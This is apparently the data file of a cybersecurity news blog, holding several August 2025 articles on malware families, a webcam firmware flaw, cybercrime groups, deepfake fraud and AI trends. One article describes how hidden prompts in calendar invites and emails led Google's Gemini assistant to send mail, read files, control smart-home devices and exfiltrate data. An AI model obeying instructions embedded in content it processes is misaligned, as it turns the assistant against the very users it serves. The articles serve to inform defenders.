      <h3>🔍 What Can Generative AI Do?</h3><br>
      <ul>
        <li>🛠 <strong>Simulate Cyberattacks:</strong> Generative AI can mimic real-world cyberattacks to test your systems, making red teaming and penetration testing faster and more realistic.</li>
        <li>📈 <strong>Detect Anomalies:</strong> By analyzing system logs and traffic patterns, it can highlight suspicious behavior that traditional systems might miss.</li>
        <li>🔄 <strong>Automated Threat Modeling:</strong> AI systems can generate evolving attack scenarios that adapt to real-time defenses.</li>
        <li>🔐 <strong>Enhance Zero Trust Architecture:</strong> AI helps verify access continuously by understanding user behavior profiles.</li>
      </ul>

      <h3>🚨 Why It Matters</h3><br>
      <p>Attackers are already experimenting with AI for phishing, deepfakes, and malware. We need to meet fire with fire. Generative AI gives defenders a way to:</p>
      <ul>
        <li>🛡 Proactively identify vulnerabilities</li>
        <li>⚡ Respond faster to threats</li>
        <li>📊 Visualize complex threat data intuitively</li>
      </ul>

      <h3>🎯 Get 1% Better at Cybersecurity Today</h3><br>
      <p>Learning never stops in this field. If you're serious about stepping up your game in cybersecurity</p>
     

      <h3>📌 Final Thoughts</h3><br>
      <p>Generative AI is a double-edged sword. But in the right hands, it can become a powerful tool for protecting networks, systems, and data. The future of cybersecurity will be human + AI—working side by side to outsmart evolving threats.</p>

      <blockquote style="border-left:4px solid #2563eb;padding-left:1em;margin-top:1em;">
        ⚡ Stay ahead. Learn fast. Defend smart.
      </blockquote>
    </div>
  `},{id:"gemini-calendar-exploit-2025",title:"Gemini Exploited via Weaponized Calendar Invites",subtitle:"Google’s AI Assistant Abused to Steal Emails and Control Devices",date:"2025-08-08",author:"EthicalByte",summary:"calendar invites, hidden prompts, smart-home hijacks, high-risk Promptware, now patched.",tags:["AI Security","Prompt Injection","Google Gemini","Cyber Attacks","2025"],imageKey:"geminicalendarexploitbanner",content:`
    <div style="background-color:#f8f9fa;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#212529;">🛡️ Gemini Exploited via Weaponized Calendar Invites</h3><br>
        <p style="font-style:italic;">Google’s AI Assistant Abused to Steal Emails and Control Devices</p>
      </div>

      <section style="margin-top:20px;">
        <h3 style="color:#007bff;">🧠 What Happened</h3><br>
        <p>A newly discovered vulnerability chain targets Google's Gemini AI assistant via malicious calendar invites and weaponized email prompts. These indirect prompt injections are part of a growing trend called <strong>Targeted Promptware Attacks</strong>.</p>
        <p>The attacker embeds harmful prompts inside calendar event descriptions or email content. When Gemini processes these, it treats them as user instructions — bypassing user intent and executing unintended commands.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <h3 style="color:#856404;">⚙️ How the Exploit Works</h3><br>
        <ol>
          <li>Attacker sends a crafted calendar invite or Gmail with hidden prompts inside descriptions or metadata.</li>
          <li>Gemini automatically processes the content when triggered by user interaction or background sync.</li>
          <li>The assistant executes unintended commands — including sending emails, accessing documents, or controlling smart devices.</li>
        </ol>
        <p>This process is completely invisible to the user — making it a <strong>zero-interaction exploit vector</strong>.</p>
      </section>

      <section style="margin-top:20px;">
        <h3 style="color:#dc3545;">🚨 Key Risks Identified</h3><br>
        <ul>
          <li>✅ 73% success rate in enterprise-level threat simulations</li>
          <li>🔓 Full access to Gmail, Google Docs, Calendar & Drive</li>
          <li>🎛️ Unauthorized control of connected smart home devices (lights, cameras, locks)</li>
          <li>📹 Covert streaming of Google Meet sessions without participant awareness</li>
          <li>📤 Silent data exfiltration via auto-forwarded emails or AI-generated summaries</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h3 style="color:#007bff;">📉 Why It Matters</h3><br>
        <p>This is a textbook case of <strong>prompt injection without prompting</strong>. Users don’t even need to engage — the AI assistant does it for them. Calendar invites and emails are now double-edged swords: productivity tools and possible payload vectors.</p>
        <p>With AI models becoming default handlers for messages, calendars, and tasks — prompt-layer abuse is inevitable unless controls are built in.</p>
      </section>

      <section style="margin-top:20px;background:#cce5ff;padding:15px;border-radius:8px;">
        <h3 style="color:#004085;">🧩 Technical Analysis</h3><br>
        <p>Gemini’s NLP pipeline doesn’t distinguish between user-intended content and attacker-embedded instructions. The model parses the entire content field without proper context validation, leading to unexpected behavior.</p>
        <p>This type of <strong>context collapse</strong> is critical in LLMs that auto-process user data from various surfaces (like calendar, chat, email).</p>
        <ul>
          <li>Input parsing lacks strict role-based separation</li>
          <li>No guardrails on background AI actions triggered via system-level integrations</li>
          <li>Prompt injection filters only apply to chat UI, not system triggers</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h3 style="color:#155724;">✅ Mitigations</h3><br>
        <ul>
          <li>🛡️ Enable sandbox execution modes for calendar/email parsing</li>
          <li>🚫 Disable auto-execution of assistant actions without user confirmation</li>
          <li>🧽 Sanitize structured content (i.e., event metadata) before ingestion</li>
          <li>🧠 Context-separation models for input isolation</li>
          <li>📚 User education on AI-triggering metadata (event notes, descriptions)</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h3 style="color:#155724;">🔮 Final Thoughts</h3><br>
        <p>This exploit underlines a major blindspot in AI integration — invisible inputs with powerful outcomes.</p>
        <p>It’s time to treat AI assistants as programmable interfaces, not static tools. That means adding logs, alerts, approval workflows, and context filters — just like any other endpoint.</p>
        <p>As attackers shift their focus from users to the AI agents acting on their behalf, defenders must adapt — or the assistant becomes the insider threat.</p>
      </section>

    </div>
  `},{id:"lenovo-badcam-exploit-2025",title:"⚡️ Lenovo Webcams Hacked into Remote BadUSB Weapons",subtitle:"Flawed firmware turns cameras into covert cyber weapons",date:"2025-08-11",author:"EthicalByte",summary:"Lenovo “BadCam” Exploit – A firmware flaw in certain Linux-based Lenovo webcams lets attackers turn them into BadUSB weapons. Malicious updates can inject keystrokes, survive system wipes, and spread to other devices — making everyday webcams a stealthy, persistent cyber threat.",tags:["Firmware Security","Lenovo","BadUSB","Cyber Attacks","2025"],imageKey:"lenovobadcamexploitbanner",content:`
     <div style="background-color:#f8f9fa;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#212529;">⚡ Lenovo Webcams Can Be Hacked into Remote BadUSB Weapons</h3><br>
        <p style="font-style:italic;">Firmware Flaw Allows Keystroke Injection, Persistence, and Cross-Host Infection</p>
      </div>

      <section style="margin-top:20px;">
        <h3 style="color:#007bff;">🧠 What Happened</h3><br>
        <p>Security researchers have uncovered a critical vulnerability in select Linux-based Lenovo webcams that lets attackers transform them into <strong>BadUSB-style attack devices</strong>. The exploit, dubbed <strong>“BadCam”</strong>, abuses flawed firmware update checks to gain deep control over the camera hardware.</p>
        <p>Once compromised, the webcam can inject malicious keystrokes, survive system wipes, and even infect other machines it connects to.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <h3 style="color:#856404;">⚙️ How the “BadCam” Exploit Works</h3><br>
        <ol>
          <li>Attacker delivers a malicious firmware payload — either remotely via a compromised update channel or physically by swapping the device.</li>
          <li>The webcam’s flawed validation process accepts the rogue firmware without cryptographic checks.</li>
          <li>Once infected, the device can impersonate a USB keyboard and inject keystrokes into the host system.</li>
          <li>It maintains persistence across OS reinstalls and can re-infect other connected systems.</li>
        </ol>
        <p>This effectively turns a harmless webcam into a covert cyber weapon.</p>
      </section>

      <section style="margin-top:20px;">
        <h3 style="color:#dc3545;">🚨 Key Risks Identified</h3><br>
        <ul>
          <li>🔓 Full host compromise via keystroke injection</li>
          <li>♻️ Persistent malware that survives OS wipes</li>
          <li>📤 Cross-host propagation via removable devices</li>
          <li>🕵️ Covert data exfiltration and command execution</li>
          <li>⚠️ Potential weaponization in supply chain attacks</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h3 style="color:#007bff;">📉 Why It Matters</h3><br>
        <p>USB-based firmware attacks have long been a stealthy hacker favorite. “BadCam” makes them easier than ever, thanks to consumer devices with weak update integrity checks. This turns everyday peripherals into long-term footholds for attackers.</p>
      </section>

      <section style="margin-top:20px;background:#cce5ff;padding:15px;border-radius:8px;">
        <h3 style="color:#004085;">🧩 Technical Analysis</h3><br>
        <p>The vulnerability lies in the camera’s firmware update process, which:</p>
        <ul>
          <li>Does not enforce signed firmware validation</li>
          <li>Allows firmware downgrade to vulnerable versions</li>
          <li>Permits arbitrary USB HID (Human Interface Device) profile switching</li>
        </ul>
        <p>This combination allows attackers to transform the webcam into a programmable BadUSB platform capable of launching low-level attacks undetected.</p>
      </section>

      <section style="margin-top:20px;">
        <h3 style="color:#155724;">✅ Mitigations</h3><br>
        <ul>
          <li>🛡️ Deploy signed firmware with cryptographic integrity checks</li>
          <li>🚫 Disable USB HID emulation in non-keyboard devices</li>
          <li>📦 Restrict firmware updates to secure, vendor-controlled channels</li>
          <li>🧠 Train users to treat peripheral firmware updates as high-risk operations</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h3 style="color:#155724;">🔮 Final Thoughts</h3><br>
        <p>BadCam is a wake-up call: any USB device with updatable firmware can be a Trojan horse.</p>
        <p>Vendors must treat firmware signing and validation as non-negotiable, and enterprises should enforce strict device trust policies — before a harmless webcam becomes a hacker’s beachhead.</p>
      </section>

    </div>
  `},{id:"malware-threats-2025",title:"Top 5 Malware Threats to Watch Out for in 2025",subtitle:"AI-powered evasion, stealth delivery, and dark web scaling — here’s what’s coming.",date:"2025-08-12",author:"EthicalByte",summary:"AI-powered, stealthy, service-based, fueled by dark web data, and fully automated.",tags:["malware","cybersecurity","threats","2025"],imageKey:"malwareTop5",content:`
    <section style="font-family: Arial, sans-serif; color: #f5f5f5; background: linear-gradient(135deg, #0a0f24, #162447); padding: 20px; border-radius: 12px;">
      <h3 style="background: linear-gradient(90deg, #ff4d4d, #ff9966); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-size: 2.4em; font-weight: bold;">🚨 Top 5 Malware Threats to Watch Out for in 2025</h3><br>
      <p style="font-size: 1.1em; line-height: 1.6;">
        Cybersecurity researchers are raising alarms about the most dangerous malware families expected to dominate in 2025. 
        These threats are becoming more sophisticated — using AI-powered evasion, stealth delivery mechanisms, and dark web marketplaces to scale attacks.
      </p>
      <p style="font-size: 1em; color: #ccc;">
        The shift to remote work, cloud services, and IoT devices is giving cybercriminals a bigger attack surface than ever before.
      </p>
    </section>

    <section style="background: linear-gradient(135deg, #13294b, #1f4068); padding: 20px; margin-top: 15px; border-radius: 10px;">
      <h3 style="background: linear-gradient(90deg, #ffcc00, #ffdd66); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">🛡 The Big 5 Threats of 2025</h3><br>
      <ol style="font-size: 1em; line-height: 1.8; color: #ddd;">
        <li><strong>Lumma Stealer</strong> – Advanced info-stealer that targets browser data, crypto wallets, and saved credentials. Known for spreading through fake login pages, phishing emails, and malicious CAPTCHA verifications.</li>
        <li><strong>Agent Tesla</strong> – Long-standing spyware/keylogger that can record keystrokes, capture screenshots, and exfiltrate credentials via SMTP or FTP. Frequently updated to evade detection.</li>
        <li><strong>RedLine Stealer</strong> – A malware-as-a-service (MaaS) platform that even amateur hackers can rent. Targets browsers, FTP clients, and VPN credentials.</li>
        <li><strong>Vidar</strong> – Modular info-stealer capable of adding custom plugins for deeper infiltration. Known for using cracked software downloads as a delivery vector.</li>
        <li><strong>FormBook</strong> – Veteran malware still active after years, using macro-enabled documents and drive-by downloads to steal credentials and form data.</li>
      </ol>
    </section>

    <section style="background: linear-gradient(135deg, #1f1c2c, #928DAB); padding: 20px; margin-top: 15px; border-radius: 10px;">
      <h3 style="background: linear-gradient(90deg, #66ffcc, #00e6b8); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">🌀 How They Spread</h3><br>
      <ul style="font-size: 1em; line-height: 1.6; color: #ddd;">
        <li>🎣 <strong>Phishing Campaigns</strong> – Fake login portals, fraudulent invoices, and targeted spear-phishing emails.</li>
        <li>📎 <strong>Malicious Attachments</strong> – PDF, Word, and Excel files with embedded malware scripts.</li>
        <li>💻 <strong>Software Cracks</strong> – Freeware and pirated software downloads laced with trojans.</li>
        <li>🌐 <strong>Compromised Websites</strong> – Drive-by downloads from infected or hijacked sites.</li>
      </ul>
    </section>

    <section style="background: linear-gradient(135deg, #3a1c71, #d76d77, #ffaf7b); padding: 20px; margin-top: 15px; border-radius: 10px;">
      <h3 style="background: linear-gradient(90deg, #ff9966, #ffcc99); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">🗓️ Notable 2025 Incidents</h3><br>
      <p>
        In Q1 2025 alone, Lumma Stealer was linked to over <strong>1.2 million compromised accounts</strong>. 
        RedLine Stealer campaigns have been spotted targeting cryptocurrency traders, while Agent Tesla variants are now bypassing some endpoint security tools.
      </p>
    </section>

    <section style="background: linear-gradient(135deg, #283c86, #45a247); padding: 20px; margin-top: 15px; border-radius: 10px;">
      <h3 style="background: linear-gradient(90deg, #66ff99, #99ffcc); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">🛡 Mitigation Tips</h3><br>
      <ul style="font-size: 1em; line-height: 1.6; color: #ddd;">
        <li>Enable multi-factor authentication (MFA) for all accounts.</li>
        <li>Use endpoint protection with behavior-based detection.</li>
        <li>Educate employees about phishing and social engineering tactics.</li>
        <li>Keep operating systems, browsers, and plugins updated.</li>
        <li>Regularly back up important files to offline storage.</li>
      </ul>
    </section>

    <section style="padding: 20px; margin-top: 15px; background: linear-gradient(135deg, #1e3c72, #2a5298); border-radius: 10px;">
      <h3 style="background: linear-gradient(90deg, #66ccff, #99ddff); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">📝 Final Take</h3><br>
      <p>
        2025 is shaping up to be a battleground year between cyber defenders and increasingly advanced info-stealers. 
        Whether you’re an individual user or a large enterprise, proactive security practices are no longer optional — they’re a survival necessity.
      </p>
    </section>
  `},{id:"shinyhunters-scatteredspider-alliance-2025",title:"ShinyHunters & Scattered Spider Join Forces — A Dangerous Cyber Alliance Emerges",subtitle:"Salesforce users under attack, banks and financial firms could be next",date:"2025-08-13",summary:"ShinyHunters and Scattered Spider, two of the world’s most dangerous cybercrime groups, have teamed up. After targeting Salesforce users globally, experts warn their next focus could be banks and financial institutions — making this alliance a major threat to global cybersecurity.",author:"EthicalByte",tags:["Cybercrime","Threat Intelligence","Banking Security","Hacker Groups"],imageKey:"shinyspider2025",content:`
    <section style="padding: 20px; font-family: Arial, sans-serif; background: linear-gradient(135deg, #1a1f3b, #3b0066); color: white;">
      <h3 style="font-size: 28px; margin-bottom: 15px; color: #ffcc00;">⚠️ ShinyHunters + Scattered Spider: A Cybercrime Super-Team</h3><br>
      <p style="font-size: 16px; line-height: 1.6;">
        Two of the most dangerous cybercriminal groups in recent years — <strong>ShinyHunters</strong> and <strong>Scattered Spider</strong> — have joined forces, combining their unique skill sets into one high-powered cybercrime syndicate. 
        This alliance represents a massive leap in the threat landscape, and early indicators suggest they’re already executing coordinated campaigns with alarming precision.
      </p>
    </section>

    <section style="padding: 20px; background: linear-gradient(135deg, #330066, #660033); color: white;">
      <h3 style="color: #ffcc00;">🚨 What Happened?</h3><br>
      <p style="font-size: 16px; line-height: 1.6;">
        Cybersecurity researchers have confirmed multiple overlapping attack signatures from both groups in ongoing <strong>Salesforce-targeted phishing waves</strong>. 
        The attacks involve fraudulent login portals, MFA bypass attempts, and credential harvesting infrastructure hosted across multiple countries.
      </p>
      <p style="font-size: 16px; line-height: 1.6;">
        The real concern: evidence from dark web forums suggests this partnership is only phase one — with <strong>banking networks, fintech companies, and payment processors</strong> already being probed for weaknesses.
      </p>
    </section>

    <section style="padding: 20px; background: linear-gradient(135deg, #003366, #001a33); color: white;">
      <h3 style="color: #ffcc00;">💡 Why This Alliance is a Game-Changer</h3><br>
      <ul style="font-size: 16px; line-height: 1.6; padding-left: 20px;">
        <li><strong>ShinyHunters</strong> — infamous for large-scale data breaches, including millions of leaked credentials from top tech firms.</li>
        <li><strong>Scattered Spider</strong> — masters of social engineering and SIM swapping attacks against corporate networks.</li>
        <li>Combining breach expertise with advanced impersonation tactics creates a <em>full-spectrum attack capability</em>.</li>
        <li>Their combined intel-sharing means faster, more adaptive campaigns that bypass traditional defenses.</li>
      </ul>
    </section>

    <section style="padding: 20px; background: linear-gradient(135deg, #330000, #660000); color: white;">
      <h3 style="color: #ffcc00;">🛡️ Immediate Defense Measures</h3><br>
      <ul style="font-size: 16px; line-height: 1.6; padding-left: 20px;">
        <li>Enforce <strong>multi-factor authentication</strong> for all accounts — preferably hardware-based tokens.</li>
        <li>Implement <strong>phishing-resistant login flows</strong> with conditional access policies.</li>
        <li>Run <strong>threat hunting exercises</strong> to identify suspicious logins and data exfiltration attempts.</li>
        <li>Educate employees on spear-phishing red flags and deepfake-based impersonations.</li>
      </ul>
    </section>

    <section style="padding: 20px; background: linear-gradient(135deg, #001a1a, #003333); color: white;">
      <h3 style="color: #ffcc00;">🔍 Final Thoughts</h3><br>
      <p style="font-size: 16px; line-height: 1.6;">
        This isn’t just two hacking crews working together — it’s a sign of organized cybercrime’s evolution into multi-specialist joint ventures. 
        Financial institutions, SaaS providers, and global enterprises should prepare for attacks that merge multiple breach vectors into a single, coordinated assault.
      </p>
      <p style="font-size: 16px; line-height: 1.6;">
        If left unchecked, the <strong>ShinyHunters–Scattered Spider</strong> alliance could set a dangerous precedent, encouraging other groups to merge resources for even greater damage potential.
      </p>
    </section>
  `},{id:"ai-ml-innovations-aug-2025",title:"AI and Machine Learning Innovations Powering the Future",subtitle:"From edge computing breakthroughs to AI-powered decision-making, here’s what’s shaping the AI landscape in August 2025",date:"2025-08-13",summary:"AI/ML systems face growing threats like data poisoning, model theft, and adversarial attacks, demanding stronger security and monitoring.",author:"EthicalByte",tags:["AI","Machine Learning","Innovation","Tech Trends","Automation","Data Science"],imageKey:"aimlinnovations2025",content:`
    <section style="padding: 20px; font-family: Arial, sans-serif; line-height: 1.6; background-color: #eaf6f6; border-radius: 8px;">
  <h3 style="color: #006d77;">AI and Machine Learning – The August 2025 Evolution</h3><br>
  <p style="color: #264653;">Artificial Intelligence (AI) and Machine Learning (ML) continue to break technological boundaries, transforming industries and influencing every corner of the digital ecosystem. This month’s developments highlight not only advancements in computational capability but also the real-world integration of AI in security, healthcare, business operations, and personal productivity. Here’s a deep dive into the most impactful trends making waves in August 2025.</p>
</section>

<section style="padding: 20px; background-color: #fefae0; border-radius: 8px; margin-top: 15px;">
  <h3 style="color: #e76f51;">AI at the Edge – Bringing Intelligence Closer to Data</h3><br>
  <p style="color: #264653;">Edge AI is no longer a futuristic concept—it’s becoming a necessity. By running AI models directly on edge devices (such as IoT sensors, security cameras, and mobile devices), organizations can process data in real-time without relying on cloud latency. This is especially critical in industries like autonomous vehicles, predictive maintenance in manufacturing, and on-the-spot health diagnostics.</p>
  <p style="color: #264653;">Recent breakthroughs have reduced the model size and power requirements, enabling advanced neural networks to run efficiently even on low-energy devices. This not only improves performance but also strengthens data privacy, as sensitive information never needs to leave the device.</p>
</section>

<section style="padding: 20px; background-color: #edf6f9; border-radius: 8px; margin-top: 15px;">
  <h3 style="color: #006d77;">Generative AI in Decision-Making</h3><br>
  <p style="color: #264653;">Generative AI is moving beyond content creation into complex decision-support systems. Businesses are deploying large language models (LLMs) to analyze market trends, simulate future scenarios, and recommend strategic actions. For example, in the financial sector, generative AI is now used to predict investment risks and optimize portfolios with human-like reasoning, all while explaining the “why” behind its recommendations.</p>
  <p style="color: #264653;">The rise of “Explainable Generative AI” (XGAI) is also helping organizations trust AI outputs by offering transparency on decision logic, critical for compliance-heavy sectors such as healthcare and law.</p>
</section>

<section style="padding: 20px; background-color: #fefae0; border-radius: 8px; margin-top: 15px;">
  <h3 style="color: #e76f51;">AI-Augmented Cybersecurity</h3><br>
  <p style="color: #264653;">In 2025, the cyber threat landscape has evolved to match the capabilities of AI—malware is more adaptive, phishing campaigns more convincing, and intrusion attempts more stealthy. In response, AI-powered threat detection systems are becoming the first line of defense. They can identify anomalies in network traffic within milliseconds, recognize patterns indicative of zero-day attacks, and even initiate automated incident response protocols without human intervention.</p>
  <p style="color: #264653;">However, this arms race between AI-driven attacks and AI-powered defense means cybersecurity teams must continuously train their models with fresh threat intelligence to stay ahead of adversaries.</p>
</section>

<section style="padding: 20px; background-color: #edf6f9; border-radius: 8px; margin-top: 15px;">
  <h3 style="color: #006d77;">Ethical AI Governance</h3><br>
  <p style="color: #264653;">With AI's capabilities expanding rapidly, global regulators and tech giants are prioritizing AI governance frameworks. August 2025 has seen the release of new international guidelines on AI fairness, bias mitigation, and accountability. These aim to prevent discriminatory outcomes in hiring algorithms, lending systems, and criminal justice applications.</p>
  <p style="color: #264653;">Companies are also embedding AI Ethics Officers into their teams to oversee AI project compliance and ensure alignment with societal values. This is becoming a competitive differentiator as consumers increasingly choose brands they trust with their data.</p>
</section>

<section style="padding: 20px; background-color: #fefae0; border-radius: 8px; margin-top: 15px;">
  <h3 style="color: #e76f51;">AI-Driven Scientific Discovery</h3><br>
  <p style="color: #264653;">Machine Learning is accelerating breakthroughs in scientific research. From drug discovery that once took a decade now being compressed into months, to climate models that can simulate decades of environmental change in hours—AI is redefining what’s possible.</p>
  <p style="color: #264653;">In August 2025, collaborative AI platforms are being launched where researchers can share pre-trained models tailored for niche fields, enabling smaller labs to tap into the computational power once reserved for billion-dollar organizations.</p>
</section>

<section style="padding: 20px; background-color: #eaf6f6; border-radius: 8px; margin-top: 15px;">
  <h3 style="color: #006d77;">Final Thoughts</h3><br>
  <p style="color: #264653;">The AI and ML ecosystem is shifting from experimental adoption to mission-critical integration. The innovations emerging this month prove that AI is not just a tool—it’s an active collaborator in problem-solving, creativity, and decision-making. As we move forward, the challenge will be balancing rapid technological progress with responsible and ethical deployment.</p>
  <p style="color: #264653;">In short, August 2025 reinforces a truth we can no longer ignore: AI isn’t coming for the future—it is the future.</p>
</section>

  `},{id:"ai-deepfake-cyberattacks-2025",title:"AI Deepfakes Are the New Cyber Weapon",subtitle:"Hackers are now using AI to bypass trust, create fake identities, and attack at machine speed.",date:"2025-08-17",summary:"Hackers are now using AI to deepfake your CFO’s voice, create perfect fake identities, and break into systems at machine speed.",author:"EthicalByte",tags:["AI","Deepfake","Cybersecurity","Identity Theft","Webinar"],imageKey:"aideepfakecyberattacks",content:`
    <section style="padding:20px; font-family:Arial, sans-serif; background:linear-gradient(135deg,#ffeaea,#fff); border-radius:8px;">
  <h3 style="color:#d62828; text-shadow:1px 1px #ffb3b3;">🚨 The Next Wave of AI-Powered Attacks</h3><br>
  <p>
    Cybercriminals are stepping up their game with <b style="color:#e63946;">AI-driven deepfakes</b>, 
    capable of cloning voices, creating realistic fake identities, 
    and even launching attacks at <b style="color:#f77f00;">machine speed</b>. 
    One of the scariest realities is that attackers can now impersonate 
    a <b style="color:#9d0208;">CFO’s voice</b> to trick employees into approving wire transfers 
    or confidential deals.
  </p>
</section><br>

<section style="padding:20px; background:#f1f1f1; border-left:6px solid #1d3557; border-radius:8px;">
  <h3 style="color:#1d3557;">🔑 Why This Matters</h3><br>
  <p>
    The real frontline of security is no longer the firewall — 
    it’s your <b style="color:#457b9d;">login screen</b> and <b style="color:#2a9d8f;">identity verification systems</b>. 
    Deepfake AI can bypass traditional defenses by exploiting human trust 
    instead of brute-forcing code.
  </p>
</section><br>

<section style="padding:20px; background:#edf6f9; border-radius:8px;">
  <h3 style="color:#457b9d;">🛡️ Protecting Your Business</h3><br>
  <p>
    Experts warn that companies need to adopt <b style="color:#e63946;">AI-based detection tools</b>, 
    stronger <b style="color:#6a4c93;">multi-factor authentication</b>, and continuous 
    <b style="color:#2a9d8f;">identity monitoring</b> to defend against these new threats.
  </p>
  <p>
    To dive deeper into how businesses can prepare...
  </p>
</section><br>

<section style="padding:20px; text-align:center; background:linear-gradient(135deg,#e0f7f4,#f8f9fa); border-radius:8px;">
  <h3 style="color:#2a9d8f;">⚡ Stay Ahead of AI Threats</h3><br>
  <p>
    The future of cybercrime is <b style="color:#ff6f00;">AI-powered</b>. 
    If your organization isn’t ready, it’s already at risk. 
    <b style="color:#d62828;">Defense must evolve</b> — because the attackers already have.
  </p>
</section><br>

<section style="padding:20px; background:#fdf0ff; border-radius:8px;">
  <h3 style="color:#6a1b9a;">🎭 Real-World Cases of AI Deepfake Attacks</h3><br>
  <p>
    We’ve already seen cases where fraudsters tricked companies into 
    transferring millions by using <b style="color:#6a1b9a;">AI-cloned voices</b> of executives. 
    In 2023, a multinational firm lost over <b style="color:#e63946;">$35 million</b> after scammers 
    replicated their CFO’s voice with frightening accuracy. 
    Such incidents are no longer rare — they are becoming the <b style="color:#ff6f00;">new norm</b>.
  </p>
</section><br>

<section style="padding:20px; background:#fff3cd; border-radius:8px; border-left:6px solid #ff6f00;">
  <h3 style="color:#ff6f00;">🚫 What Traditional Security Misses</h3><br>
  <p>
    Firewalls, antivirus, and basic email filters can’t detect a 
    <b style="color:#d62828;">synthetic voice call</b> or a <b style="color:#6a4c93;">hyper-realistic video deepfake</b>. 
    Employees are often the weakest link, and attackers know this. 
    By targeting <b style="color:#2a9d8f;">human trust</b> instead of systems, 
    deepfake AI bypasses nearly all old-school defenses.
  </p>
</section><br>

<section style="padding:20px; background:#f0f7ff; border-radius:8px;">
  <h3 style="color:#264653;">📊 The Growing Scale of AI Threats</h3><br>
  <p>
    According to security researchers, AI-powered identity attacks 
    have grown by <b style="color:#e63946;">over 300% in the last two years</b>. 
    With the cost of generative AI tools dropping, 
    even small hacker groups can now deploy large-scale 
    social engineering campaigns that used to be possible only for 
    <b style="color:#6a1b9a;">state-sponsored actors</b>.
  </p>
</section><br>

<section style="padding:20px; background:#fff0f0; border-radius:8px; border-left:6px solid #e63946;">
  <h3 style="color:#e63946;">🚀 The Road Ahead</h3><br>
  <p>
    The battle against deepfake cybercrime will rely on 
    <b style="color:#2a9d8f;">AI fighting AI</b>. 
    Just as attackers use machine learning to deceive, 
    defenders must use it to detect anomalies, flag suspicious behavior, 
    and protect digital identities in real time. 
    Companies that ignore this shift risk becoming 
    the next <b style="color:#d62828;">headline breach</b>.
  </p>
</section><br>

  `},{id:"ermac-v3-android-trojan-leak",title:"ERMAC V3.0 Android Banking Trojan Source Code Leaked",date:"2025-08-18",author:"EthicalByte",summary:"The full source code of ERMAC V3.0 — one of the most dangerous Android banking trojans — has been leaked, exposing its builder, backend, panels, and exfiltration servers. Here’s why this matters.",tags:["ERMAC","AndroidMalware","BankingTrojan","Cybercrime","SourceCodeLeak"],imageKey:"ermacTrojanLeak",content:`
    <div style="background:linear-gradient(135deg,#fdfdfd,#f5f6fa); padding:25px; border-radius:14px; border:1px solid #ddd; font-family:Segoe UI,Arial,sans-serif; line-height:1.6; max-width:850px; margin:0 auto;">

  <h2 style="color:#e11d48; margin-top:0; font-size:1.8em;">🚨 ERMAC V3.0 Source Code Leaked</h2><br>
  <p><strong>ERMAC V3.0</strong> — a dangerous Android banking trojan targeting financial apps, crypto wallets, and personal accounts — has had its <strong>entire source code leaked</strong>, including:</p>

  <ul style="margin:10px 0; padding-left:20px;">
    <li>✅ Backend servers & admin panel</li>
    <li>✅ Builder for new malware variants</li>
    <li>✅ Exfiltration modules</li>
    <li>✅ Default credentials exposed</li>
  </ul>

  <h3 style="color:#2563eb; font-size:1.4em;">🔍 Why This Matters</h3><br>
  <p>This leak lowers the barrier for cybercriminals — even <strong>low-skilled attackers</strong> can now deploy their own malware campaigns.</p>
  <ul>
    <li>📱 Targets <strong>700+ financial apps</strong> (banking, wallets, payments)</li>
    <li>💳 Intercepts <strong>2FA codes</strong></li>
    <li>🛠️ Includes overlay attacks, SMS theft, and keylogging</li>
    <li>⚠️ Easily adaptable for new apps</li>
  </ul>

  <h3 style="color:#ea580c; font-size:1.4em;">📉 The Bigger Picture</h3><br>
  <p>The impact is a <strong>double-edged sword</strong> — defenders gain insight, but cybercrime will likely surge with:</p>
  <ul>
    <li>🚫 More ERMAC variants in the wild</li>
    <li>🌍 Wider global spread</li>
    <li>🕵️ Adoption by new cybercrime groups</li>
  </ul>

  <!-- User Recommendations -->
  <div style="background:#fef2f2; border-left:4px solid #dc2626; padding:15px; margin:20px 0; border-radius:8px;">
    <h3 style="margin-top:0; color:#b91c1c;">🛡️ Recommendations for Users</h3><br>
    <ul style="margin:0; padding-left:20px;">
      <li>🔒 Install apps only from <strong>Google Play</strong></li>
      <li>📱 Regularly check app permissions</li>
      <li>⚠️ Avoid overlays/popups requesting sensitive info</li>
      <li>🛡️ Use mobile security tools with <strong>banking protection</strong></li>
    </ul>
  </div>

  <!-- Enterprise Recommendations -->
  <div style="background:#f0f9ff; border-left:4px solid #2563eb; padding:15px; margin:20px 0; border-radius:8px;">
    <h3 style="margin-top:0; color:#1d4ed8;">🏭 Recommendations for Enterprises</h3><br>
    <ul style="margin:0; padding-left:20px;">
      <li>✅ Monitor mobile endpoints for ERMAC activity</li>
      <li>✅ Train staff on phishing & malicious APK risks</li>
      <li>✅ Subscribe to <strong>threat intelligence feeds</strong></li>
    </ul>
  </div>

  <!-- Final Takeaway -->
  <blockquote style="border-left:4px solid #e11d48; padding-left:1em; font-style:italic; background:#fff7ed; margin:20px 0; border-radius:6px;">
    With ERMAC V3.0’s source code public, the Android threat landscape faces a surge in activity.  
    <strong>For users</strong>: caution is critical.  
    <strong>For enterprises</strong>: proactive defense is the only way forward.
  </blockquote>

  <!-- Mobile-friendly inline responsiveness -->
  <div style="display:none;">
    <style>
      @media (max-width:600px) {
        .ermac-article { padding:15px !important; font-size:0.95em !important; }
        .ermac-article h2 { font-size:1.4em !important; }
        .ermac-article h3 { font-size:1.2em !important; }
        .ermac-article ul { padding-left:18px !important; }
      }
    </style>
  </div>

</div>

